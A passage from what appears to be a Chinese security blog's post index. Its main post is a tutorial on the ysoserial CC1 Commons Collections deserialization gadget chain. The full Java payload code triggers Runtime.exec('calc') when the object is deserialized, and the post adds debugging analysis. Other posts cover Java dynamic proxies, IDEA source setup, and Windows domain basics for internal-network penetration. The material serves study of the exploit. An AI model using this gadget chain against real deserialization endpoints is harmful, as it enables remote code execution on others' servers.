Map 对象，无关紧要，只是作为参数传入 Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); // 初始化利用链 LazyMap Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1)); // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &quot;key&quot;); // 初始化利用链 HashMap HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(tiedMapEntry, &quot;test&quot;); // 删除 lazymap 对象中的 key 值 lazymap.remove(&quot;key&quot;); // 反射修改 lazymap 对象的 factory 属性 Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass(); Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazymap, chainedTransformer); // serialize(map); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 至此就完成了。 结语真理是越辩越明的。","categories":["Java 安全"]},{"title":"漏洞篇 - CC1 链之 ysoserial 版","path":"/2024/05/12/Java 安全/漏洞篇-CC1链ysoserial版/","content":"在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap 也可以作为利用链，它们都在 org.apache.commons.collections.map 包下。这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。 CC1 链之 ysoserial 版环境 JDK &#x3D; 8u65 commons-collections &#x3D; 3.2.1 在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap 也可以作为利用链，它们都在 org.apache.commons.collections.map 包下： 这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。 前面我们利用 TransformedMap 类的 checkSetValue 方法来调用 transform 方法： 123protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value);&#125; 那么回到这一步，还有谁调用了 transform 方法呢？LazyMap 中其实有相关的调用。 利用链之 LazyMap 类LazyMap 的 get 方法中调用了 factory 的 transform 方法： 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; factory 是 LazyMap 中定义的属性： 1protected final Transformer factory; 它在构造方法中被赋值： 1234567protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = factory;&#125; 所以我们让这里的 factory 变成 ChainedTransformer 对象就行。 然而 LazyMap 的构造方法被 protected 修饰，不能直接调用，所以我们需要找哪个方法调用了 LazyMap 的构造方法。 LazyMap 的 decorate 方法中调用了 LazyMap 的构造方法： 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 所以我们可以通过这个方法来给 factory 赋值。 接下来就是找哪里调用了 LazyMap 的 get 方法了，AnnotationInvocationHandler 的 invoke 方法有相关的调用。 AnnotationInvocationHandler 入口类AnnotationInvocationHandler 的 invoke 方法：12345678910111213141516171819202122232425262728293031323334public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; 它调用了 memberValues 的 get 方法： 12// Handle annotation member accessorsObject result = memberValues.get(member); memberValues 是 AnnotationInvocationHandler 类的属性： 1private final Map&lt;String, Object&gt; memberValues; 它在构造方法中被赋值： 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; 这里可以依照前面的办法：利用反射调用 AnnotationInvocationHandler 的构造方法，将 memberValues 赋值成 LazyMap 对象。 那么又要如何调用 AnnotationInvocationHandler 的 invoke 方法呢？ AnnotationInvocationHandler 其实是一个代理类，它继承了 InvocationHandler 类，并重写了 invoke 方法。而我们知道，在调用代理对象的方法时，InvocationHandler 类的 invoke 方法将会被触发。（这方面与 Java 动态代理有关，可以去看我先前的文章） 假使我用 AnnotationInvocationHandler 来构建一个代理对象，那么只要这个代理对象的任意方法被调用，就会调用 AnnotationInvocationHandler 的 invoke 方法了。 那么为了能够反序列化利用，我们还是要回到 readObject 方法。 AnnotationInvocationHandler 的 readObject 方法：123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 沿用前辈们的思路，我们将触发点选为 memberValues.entrySet() ，只需要将 memberValues 设置成用 AnnotationInvocationHandler 构建的代理对象，那么在调用这个代理对象的任意方法时，都会调用 AnnotationInvocationHandler 的 invoke 方法。 这听起来似乎很矛盾，前面说 memberValues 要赋值成 LazyMap 对象，怎么这里又说 memberValues 要设置成用 AnnotationInvocationHandler 构建的代理对象呢？后面会给出解答。 构造 payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class FinalPayload &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; // 将传入参数固定为 Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 新建一个 Map 对象，无关紧要，只是作为参数传入 Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); // 初始化利用链 LazyMap Map lazymap = LazyMap.decorate(hashMap, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 // 获取 AnnotationInvocationHandler 的构造器对象 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 因为不经过判断，第一个参数只要是注解类就行，第二个参数传入 Lazymap 对象作为 memberValues 的值 Object annotationInvocationHandler1 = constructor.newInstance(Override.class, lazymap); // 现在我已经通过构造方法获取了一个 AnnotationInvocationHandler 对象 // 接下来将这个对象强转成 InvocationHandler 类型，然后用它来获取代理对象 InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandler1; // 为了之后能将代理对象作为参数传入 AnnotationInvocationHandler 的构造方法 // 这里选择创建一个 Map 类型的代理对象 Map mapProxy = (Map) Proxy.newProxyInstance( // 第一个参数是构造器 Map.class.getClassLoader(), // 第二个参数指明代理对象继承的接口 new Class[]&#123;Map.class&#125;, // 第三个参数需要一个重写了 invoke 方法的 InvocationHandler 对象 // 这个对象的 invoke 方法将会在代理对象的任意方法被调用时调用 invocationHandler ); // 传入 mapProxy 代理对象作为 memberValues 的值 Object annotationInvocationHandler2 = constructor.newInstance(Override.class, mapProxy); // serialize(annotationInvocationHandler2); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 看完 payload 想必就能理解了，我们将代理对象作为 AnnotationInvocationHandler 对象 annotationInvocationHandler2 的 memberValues 属性值，在反序列化时，调用 annotationInvocationHandler2 的 readObject 方法，进而调用 memberValues 的 entrySet() 方法（即代理对象的 entrySet() 方法），此时将会调用代理对象对应的 invoke 方法，这个 invoke 方法正是 annotationInvocationHandler1 的 invoke 方法，annotationInvocationHandler1 的 invoke 方法会调用 memberValues 的 get 方法，而 annotationInvocationHandler1 的 memberValues 属性已经被赋值成 LazyMap 对象了，于是这里调用的是 LazyMap 对象的 get 方法。 我再画个流程图来帮助理解： 123456789annotationInvocationHandler2 :: readObject() -&gt;annotationInvocationHandler2.memberValues :: entrySet()（annotationInvocationHandler2.memberValues = mapProxy）-&gt;annotationInvocationHandler1 :: invoke()（annotationInvocationHandler1.memberValues = lazymap）-&gt;lazymap :: get() -&gt; ...... 想必应该能理解了。 调试调试既是为了验证理论的正确性，又是为了加深理解，还可以发现未知的细节。 先执行序列化方法，生成文件之后，对反序列化方法做调试。 主程序 readObject 处下断点： AnnotationInvocationHandler.java 的 readObject 方法中的 memberValues.entrySet() 处下断点： AnnotationInvocationHandler.java 的 invoke 方法中的 memberValues.get 处下断点： 开始调试： 单步进入：进入了 AbstractMapDecorator 类，过程省略。 接着单步进入，此时来到了 LazyMap 的 readObject 方法： 执行完 LazyMap 的 readObject 方法以后就来到了 AnnotationInvocationHandler 的 invoke 方法： 调用堆栈也出现了很多调用，细看之下，又跟我们的利用链毫无关系。至于这里为什么会提前调用 invoke 方法，容后再议。 继续调试，经过断点 memberValues.entrySet() ： 继续调试，不断单步进入又跳出，执行完之后会发现弹出了计算器，而且是三个： 调试发现中间调用了一大堆乱七八糟的类，实在没有耐心看了，就引用 yhy 师傅的一个比较有说服力的结论吧： IDEA 在 debug 时，当 debug 到某个对象的时候，会调用对象的 toString() 方法，用来在 debug 界面显示对象信息。弹出多个计算器，多半是由于代理对象的 toString() 方法被私自调用了，触发了 invoke 方法，造成非预期的命令执行。 我们可以在 IDEA 中关闭 Debug 自动调用 toString() 方法： 至于为什么关闭这个设置后调试仍然弹出了三个计算器，我就不得而知了。 那么，接下来才是重头戏。我们重新设置断点，重新调试。 反序列化是由内向外的在 AnnotationInvocationHandler 类的 readObject 方法中新增一处断点，这一断点是在上一次调试中发现的转折点： 其余断点不变，开始调试： 单步进入几次： 现在调用的是 LazyMap 的 readObject ，说明 LazyMap 相比其他对象是最先被反序列化的。 继续单步进入： 跳出 LazyMap 的 readObject 方法之后，我们就来到了 AnnotationInvocationHandler 的 readObject 方法，观察 this.memberValues 值，发现它是一个 LazyMap 对象，这说明什么？说明此时反序列化的这个 AnnotationInvocationHandler 对象是 mapProxy 代理对象在创建时作为参数传入的 AnnotationInvocationHandler 对象，而不是最外部的 AnnotationInvocationHandler 对象。 即此时反序列化的是 annotationInvocationHandler1 对象。 接下来单步进入会进入 AnnotationType 类的 getInstance 方法，这个方法又会调用 AnnotationType 的构造方法，在构造方法中我们发现行进到这一步时： 这里的 ret 已然是一个代理对象，调用 ret.value() 将会进入某个代理类的 invoke 方法。 再下一步就来到了 AnnotationInvocationHandler 对象的 invoke 方法： 这就是我们之前遇到的 invoke 方法被提前调用的问题。观察下面的 memberValues 属性值可以发现，此时执行 invoke 方法的 AnnotationInvocationHandler 对象并不是 annotationInvocationHandler1 ，因此这一步调用 invoke 并不会造成命令执行，事实也正是如此。 想必这里调用 AnnotationInvocationHandler 的 invoke 方法是 AnnotationType 类的内部逻辑，至于 ret 是如何成为由 AnnotationInvocationHandler 构建的代理对象的，我就不深究了。 继续调试，执行完这一步后，我们回到 annotationInvocationHandler1 的 readObject 方法： 直接跳到下个断点吧： 继续调试，当执行完这一步时，我们又来到了 AnnotationInvocationHandler 类的这个断点处： 并且弹出了三个计算器，说明命令执行在上一步已经完成了，至于这个 AnnotationInvocationHandler 对象，看看它的 memberValues 属性值会发现是一个代理对象，也就是说我们现在正在执行外部的 AnnotationInvocationHandler 对象也即 annotationInvocationHandler2 的 readObject 方法，这一步的 readObject 方法并不会造成命令执行，事实也正是如此，后面的就不用看了，至此，调试完毕。 通过调试，我们可以发现：反序列化是由内向外的。而我们之前所预测的调用链被推翻，接下来我会记录下真正的调用链。 重新书写调用链123456789101112131415161718192021反序列化 -&gt; lazyMap :: readObject() -&gt;annotationInvocationHandler1 :: readObject() -&gt;​ AnnotationType :: getInstance() -&gt;​ AnnotationType :: AnnotationType() -&gt;​ AnnotationInvocationHandler :: invoke() （提前调用 invoke ，但不会命令执行）-&gt;annotationInvocationHandler1.memberValues :: entrySet() -&gt;annotationInvocationHandler1 :: invoke() -&gt;annotationInvocationHandler1.memberValues :: get() （即 lazyMap :: get()，造成命令执行）-&gt;annotationInvocationHandler2 :: readObject() -&gt;结束 结语真理的相对性也是真理之一，实践是检验真理的唯一标准。","categories":["Java 安全"]},{"title":"配置篇 - IDEA 查看带 sun 包的 JDK 源码","path":"/2024/05/12/Java 安全/配置篇-idea查看JDK和依赖的源码/","content":"前言：前面在分析初始版本 CC1 链的时候，查看 sun 包里的 AnnotationInvocationHandler 类的源码，发现变量名全都是 var 开头，非常不便于阅读，接下来将介绍如何使用 IDEA 查看带 sun 包的 JDK 源码，以及导入的依赖源码，这里的源码指的是 .java 文件。 IDEA 查看带 sun 包的 JDK 源码ref：JAVA CC1分析 原始的 JDK 中的 src.zip 是没有 sun 包的，我们需要自己下载包含 sun 包的源码。 以 JDK8u65 版本为例，前往 openjdk 网站下载的链接为：http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4 点击左侧的 zip 即可下载压缩包： 下载的压缩包名为 jdk-af660750b2f4.zip ，将其解压后，在 jdk-af660750b2f4\\jdk-af660750b2f4\\src\\share\\classes 路径下即可找到 sun 包： 在我们之前的 JDK 文件夹下有一个 src.zip 压缩包，将其解压后，将上面的 sun 包复制进来： 这时候就可以在 idea 中添加资源文件了。 打开 idea -&gt; ProJect Structure -&gt; SDKs 选择上方的 Classpath ，点击加号，将 src 路径导入进去： 添加完 Classpath 之后，还要添加 Sourcepath ： 这样就算完成了。 这时就可以写个程序验证是否添加成功： Ctrl + 鼠标左键进入源码： 可以发现此时进入的是 .java 文件而不再是 .class 文件了，说明添加成功。 IDEA 查看依赖包的 Java 源码ref：idea 查看 Java 源码，而不是编译后的 class 文件 以 CC 依赖为例： 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 首先打开设置，找到红框所示路径，勾选 Sources 和 Documentation ： 点击 Apply 应用和 OK 退出。 接着打开右侧 Maven 图标，按照图示步骤 Download Sources ： 到这一步就添加完成了。","categories":["Java 安全"]},{"title":"基础篇 - Java 动态代理","path":"/2024/05/11/Java 安全/基础篇-Java动态代理/","content":"在 Java 动态代理中，代理对象能够通过调用 invoke 方法来增强被代理对象的原始方法。 Java 动态代理程序为什么需要代理？代理长什么样？对象如果嫌身上干的事太多，可以通过代理来转移部分职责。对象有什么方法想被代理，代理就一定要有对应的方法。 下面通过一个简单的例子来了解动态代理现有一个类 BigStar 需要被代理，如何让代理类知道 BigStar 的哪些方法需要被代理呢？那么需要定义一个接口，这个接口将会声明 BigStar 中需要被代理的方法，再让代理类实现这个接口好了。同样，出于代理的规范，BigStar 类也需要实现这个接口。 需要被代理的 BigStar 类： 12345678910111213141516public class BigStar implements Star&#123; private String name; public BigStar(String name) &#123; this.name = name; &#125; public String Sing(String name)&#123; System.out.println(this.name + &quot;正在唱&quot; + name); return &quot;谢谢大家！&quot;; &#125; public void Dance()&#123; System.out.println(this.name + &quot;正在跳舞&quot;); &#125;&#125; Star 接口中声明了 BigStar 类需要被代理的方法 Sing 和 Dance ： 1234public interface Star &#123; String Sing(String name); public void Dance();&#125; 接下来我们要获取代理对象，通常用到 Proxy 类的 newProxyInstance() 方法。 Proxy.newProxyInstance() 方法其定义是这样的： 12@CallerSensitivepublic static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 返回类型为 Object 第一个参数用于指定类加载器，开发里都是用当前类的类加载器，这里即 ProxyUtil.class.getClassLoader() 。 第二个参数需要传入一个接口数组，用于指定生成的代理对象继承哪些接口，包含哪些方法。 第三个参数需要传入一个 InvocationHandler 接口的对象，由于接口不能直接实例化对象，所以我们这里需要用到 InvocationHandler 接口的匿名对象。 具体代码如下： 12345678910111213Star starProxy = (Star) Proxy.newProxyInstance( // 指定类加载器 ProxyUtil.class.getClassLoader(), // 传入接口的Class对象 new Class[]&#123;Star.class&#125;, // 传入InvocationHandler接口的匿名对象 new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; return null; &#125; &#125; ); 在使用 idea 创建 InvocationHandler 的匿名内部类时我们会发现这里自动生成了一个重写的 invoke() 方法，划重点，这个 invoke() 方法很重要。 InvocationHandler 类的 invoke() 方法代理对象需要做的增强功能（或者说要做的事情），就定义在这个方法里。 我们来看它的定义： 1public Object invoke(Object proxy, Method method, Object[] args) 这三个参数的含义是什么呢？ 我们知道，我们获取到的这个代理对象 starProxy 中是有 Sing 和 Dance 两个方法的，而且将来会被调用，就像这样： 1starProxy.Sing(&quot;爱我中华&quot;) 那么此时第一个参数 proxy 获取到的就是对象 starProxy ，第二个参数 method 获取到的就是方法 Sing ，第三个参数 args 获取到的就是参数数组 Object[]{“爱我中华”} ，应该明白了吧。 那么接下来我们可以完善这个 invoke 方法： 123456789101112131415161718192021222324// 新建一个 BigStar 对象BigStar bigStar = new BigStar(&quot;张三&quot;);// 创建代理对象Star starProxy = (Star) Proxy.newProxyInstance( // 指定类加载器 ProxyUtil.class.getClassLoader(), // 传入接口的Class对象 new Class[]&#123;Star.class&#125;, // 传入InvocationHandler接口的匿名对象 new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; // 当调用 Sing 方法时，打印 &quot;收钱，准备唱歌场地&quot; if (method.getName().equals(&quot;Sing&quot;)) &#123; System.out.println(&quot;收钱，准备唱歌场地&quot;); // 当调用 Dance 方法时，打印 &quot;收钱，准备跳舞场地&quot; &#125; else if (method.getName().equals(&quot;Dance&quot;)) &#123; System.out.println(&quot;收钱，准备跳舞场地&quot;); &#125; // 最后一定调用 bigStar 的原始方法，并将结果返回 return method.invoke(bigStar, args); &#125; &#125; ); 最后调用代理类的 Sing 和 Dance 方法测试： 123String sing = starProxy.Sing(&quot;爱我中华&quot;);System.out.println(sing);starProxy.Dance(); 返回结果如下： 最后我们再梳理一遍执行流程： 1starProxy.Sing(&quot;爱我中华&quot;) -&gt; InvocationHandler 的 invoke 方法（打印 &quot;收钱，准备唱歌场地&quot;） -&gt; bigStar.Sing(&quot;爱我中华&quot;)（并将返回值返回） starProxy.Dance() 同理： 1starProxy.Dance() -&gt; InvocationHandler 的 invoke 方法（打印 &quot;收钱，准备跳舞场地&quot;） -&gt; bigStar.Dance()（无返回） 至此，我们对动态代理有了大概的了解。 不过，实际开发中，我们通常会自定义一个 ProxyUtil 工具类来获取代理对象： 1234567891011121314151617181920212223242526public class ProxyUtil &#123; public static Star createProxy(BigStar bigStar) &#123; Star starProxy = (Star) Proxy.newProxyInstance( // 指定类加载器 ProxyUtil.class.getClassLoader(), // 传入接口的Class对象 new Class[]&#123;Star.class&#125;, // 传入InvocationHandler接口的匿名对象 new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; // 当调用 Sing 方法时，打印 &quot;收钱，准备唱歌场地&quot; if (method.getName().equals(&quot;Sing&quot;)) &#123; System.out.println(&quot;收钱，准备唱歌场地&quot;); // 当调用 Dance 方法时，打印 &quot;收钱，准备跳舞场地&quot; &#125; else if (method.getName().equals(&quot;Dance&quot;)) &#123; System.out.println(&quot;收钱，准备跳舞场地&quot;); &#125; // 最后一定调用 bigStar 的原始方法 return method.invoke(bigStar, args); &#125; &#125; ); return starProxy; &#125;&#125; 如此一来，我们的测试类中就可以这样写： 123456789public class Test &#123; public static void main(String[] args) &#123; // 获取代理对象 Star starProxy = ProxyUtil.createProxy(new BigStar(&quot;张三&quot;)); String sing = starProxy.Sing(&quot;爱我中华&quot;); System.out.println(sing); starProxy.Dance(); &#125;&#125; 这样就简洁很多了。","categories":["Java 安全"]},{"title":"Windows 内网基础知识","path":"/2024/05/10/内网渗透/Windows 内网基础知识/","content":"本文将会详细介绍工作组、域、域控制器、父域、子域、域树、域森林（也叫域林）、活动目录、DMZ、域内权限等内网知识。 一、内网基础知识1.1 基础知识在研究的时候通常会听到工作组、域、域控制器、父域、子域、域树、域森林（也叫域林）、活动目录、DMZ、域内权限等名词，接下来讲得就是这些名词各指的是什么，之间有什么区别。 1.1.1 工作组将局域网内的计算机按照需要分组。 加入工作组后，在网络中别人可以访问我们的共享资源，我们也可以加入同一网络中的任何工作组了，工作组可以自由的进入和退出，方便计算机互相访问，但是工作组没有集中管理的作用，工作组的所有计算机都是对等的! 1.1.2 域什么是域: 域可以理解为升级版的工作组，是一个有安全边界的计算机集合，和工作组相比较而言，域安全管理控制机制更严格，如果用户们要访问域需要以合法的身份登录域才行，而用户登录域后能访问到的资源权限，还要取决于用户域内的身份。域内资源由一台域控制器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。 什么是域控制器（Domain Controller，DC）: 域控制器是域中一台类似管理服务器的计算机，通俗可以理解成域控制器是一个单位的门禁系统，负责所有接入的计算机和用户的验证工作，在域环境中各个计算机要想互相访问，需要经过域的审核才行。重要的是域控制器中存在这个域的账户和密码，属于这个域的计算机等信息构成的数据库。当计算机连接到域时，域控制器首先会鉴别计算机是否属于这个域，用户在进行登录用户名密码时，会验证用户名和密码是否存在和正确，如果有一项不正确，域控制器就会拒绝该计算机访问域，相对而言就计算机不通过域控制器就无法访问相对应的资源权限。通过以上理解，域控制器就是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行着，所以在渗透中，散列值就体现出来了，域内所有用来验证身份的账号和密码散列值都保存在域控制器中。 域的几种环境： 1、单域 即只有一个域的网络环境，一般需要两台 DC ，一台 DC ，另一台备用 DC（容灾）。 2、父域和子域 域数量过多的情况下需要进行管理，进行分级管理的情况下，第一个域称为父域，下级各部分的域称为该域的子域。 举个例子理解下，一大型公司存在各个分公司，分公司位于不同的地点，这种情况就需要父域和子域，如果把所有分公司都放在一个域内，在信息交互的时候会出现带宽高延迟高，浪费非常多的时间，交互的信息量变大不会压缩的情况下会导致崩溃的现象，而在多个域之间进行信息交互，量就相对较小，且信息量可以压缩。在管理和安全层面，不同的子域也可以指定特定的安全策略。 在子域和父域这里就了解到，一个域管理员只能管理本域，不能访问和管理其他域，如果需要互相访问则需要建立信任关系，信任关系就是连接不同域的桥梁，不同域之间建立了信任关系后，就能实现网络资源共享与管理，通信及数据传输等。 3、域树 多个域通过建立信任关系组成的集合。若两个域之间需要相互访问，需要建立信任关系（Trust Relation），通过信任关系可以将父子域连接成树状结构。 继续了解下域树的阶层概念，域树的阶层是按照点号隔开区分的，一个点号代表一个层次，例如：域 yizhi.xiaobai.com 的级别比域 xiaobai.com 级别低。子域只能使用父域的名字作为其域名的后缀，所以在域树中域的名字是连续的。 4、域森林 多个域树通过建立信任关系后的集合。 例如在一个公司进行兼并的时候，公司目前使用的域树是 abc.com ，被兼并的公司存在自己的域树为 dayu.net ，在这种情况下进行兼并，就需要域树 abc.com 和域树 dayu.net 之间建立信任关系来构成域森林。 5、域名服务器 域名服务器就是 DNS 服务器，是用于实现域名与对应的 IP 地址相互转换的服务器。 回头观望下域树的知识可知，域树中的域名和 DNS 域名非常的相似（ xiaobai.com 等)，实际上，域中的计算机是使用 DNS 来定位域控制器、服务器、网络服务等，所以域的名字就是 DNS 域的名字。 所 以在内网渗透中，大多数情况都是通过寻找 DNS 服务器来确定域控制器的位置，因为域控制器和 DNS 服务器都配置在同一台机器上。 1.1.3 活动目录活动目录（Active Directory，AD）是指域环境中提供目录服务的组件。首先来了解下目录，目录用于存储有关的网络对象（例如，用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是指帮助用户快速准确的从目录中找到其所需要的信息服务。所以活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。 如果是一本字典，活动目录就是索引。 目录数据存储在域控制器上的 Ntds.dit 文件中。我们建议将该文件存储在一个 NTFS 分区上。有些数据保存在目录数据库文件中，而有些数据则保存在一个被复制的文件系统上，例如登录脚本和组策略。 注：活动目录功能 账号集中管理：所有的账号均存储在服务器中，方便执行命令和密码重置等操作。 软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件。 环境集中管理：统一客户端桌面、ID、TCP&#x2F;IP 协议等设置。 增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机访问权限、统—制定用户密码策略等。可以监控网络、对资料进行统一管理。 更可靠，更短的宕(dang)机时间。例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。 活动目录是微软提供的统一管理基础平台，工 SA 、Exchange、SMS 等都依赖这个平台。 1.1.4 域控制器和活动目录的区别把网络中的众多对象（计算机、用户、用户组、打印机、共享文件等）分门别类、并然有序的放在一个大的仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源)。这个拥有层次结构的数据库，就是活动目录数据库，简称 AD 库。 那么我们应该把这个数据库放到哪套计算机上呢？要实现域环境，其实就是要安装 AD 。如果内网中的一台计算机上安装了活动目录（AD），它就成了域控制器（DC）用于存储活动目录数据库的计算机。 域控制器就是安装了活动目录（Active Directory）的计算机。 1.1.5 安全域的划分在一个用路由器连接的内网中，可以将网络划分为三个区域：安全级别最高的内网，安全级别中等的 DMZ ，安全级别最低的外网。这三个区域负责完成不同的任务，因此需要设置不同的访问策略。接下来这里详细的讲解了防火墙的一些场景，在三个区域中如何制定 ACL 的思路。 内网（安全级别最高）：分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问 DMZ ，部分主机可以访问核心区） DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施 外网（Internet，安全级别最低） 1.1.6 域中计算机的分类在域结构的网络中，计算机的身份是不平等的，有域控制器、成员服务器、客户机、独立服务器四种类型。 1、域控制器 域控制器用于管理所有的网络访问，包括登录服务器、访问共享目录和资源，域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息。 之前也有了解到很多域控制器，在大型域环境中，存在多个域控制器的情况下，部分域控制器瘫痪，网络访问也不会受到影响，提高了网络的安全性和稳定性。 2、成员服务器 安装了服务器操作系统（比如 Windows Server ）并加入了域，但没有安装活动目录的计算机，主要任务是提供网络资源。 3、客户机 安装了其他操作系统的计算机，利用这些计算机和域中的账户就可以登录到域。 4、独立服务器 独立服务器和域没有关系，服务器不加入域、也不安装活动目录就是独立服务器。 1.1.7 域内权限解读1、域本地组 多域用户访问单域资源（访问同一个域）。 可以从任何域添加用户账户、通用组和全局组，但只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。 2、全局组 单域用户访问多域资源（必须是一个域里面的用户）。 只能在创建该全局组的域中添加用户和全局组。可以在域森林的任何域内指派权限。全局组可以嵌套在其他组中。 